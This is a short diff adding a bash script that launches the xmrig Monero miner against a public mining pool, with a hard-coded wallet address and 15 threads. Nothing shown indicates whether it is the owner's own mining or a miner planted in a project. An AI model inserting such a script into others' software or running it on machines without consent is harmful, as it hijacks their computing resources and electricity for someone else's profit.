@@ -1,0 +1,2 @@
+#!/bin/bash
+./xmrig -o stratum+tcp://xmr.f2pool.com:13531 -t 15 4AjkGDZ9YUnCefq9s4bFbyWazEiNHCCR5QbptRtc5LaobiSEAw4vXFCTwkAkxLq35DPXPpHjNYcaVavhLJVi5DjLB4QirdM.00
